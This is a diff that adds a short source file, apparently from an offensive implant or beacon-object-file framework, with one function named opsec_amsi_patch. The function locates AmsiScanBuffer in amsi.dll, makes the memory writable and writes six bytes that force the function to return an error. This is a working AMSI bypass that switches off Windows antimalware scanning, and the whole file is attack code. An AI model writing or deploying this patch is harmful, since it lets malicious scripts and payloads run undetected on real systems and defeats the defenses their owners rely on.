@@ -1,0 +1,42 @@
+
+use bof;
+
+[Stage(Init)]
+fn opsec_amsi_patch() -> void {
+    // Locate amsi.dll. If it is not loaded into the host
+    // process this is a silent no-op - the AMSI surface is
+    // not present, so there is nothing to bypass.
+    var amsi: u64 = (u64)Kernel32.GetModuleHandleA("amsi.dll");
+    if amsi == 0 {
+        ret;
+    }
+
+    // Resolve AmsiScanBuffer. Same silent-no-op rule if the
+    // export is missing (very rare; means the loaded amsi.dll
+    // is from a Windows version that renamed the function).
+    var addr: u64 = (u64)Kernel32.GetProcAddress((void*)amsi,
+        "AmsiScanBuffer");
+    if addr == 0 {
+        ret;
+    }
+
+    var old: u32 = 0;
+    if Kernel32.VirtualProtect((void*)addr, (u64)6,
+            PAGE_EXECUTE_READWRITE, &old) == 0 {
+        ret;
+    }
+
+    // mov eax, 0x80070057   ; E_INVALIDARG
+    // ret
+    var p: char* = (char*)addr;
+    p[0] = (u8)0xB8;
+    p[1] = (u8)0x57;
+    p[2] = (u8)0x00;
+    p[3] = (u8)0x07;
+    p[4] = (u8)0x80;
+    p[5] = (u8)0xC3;
+
+    var dummy: u32 = 0;
+    Kernel32.VirtualProtect((void*)addr, (u64)6, old, &dummy);
+    ret;
+}
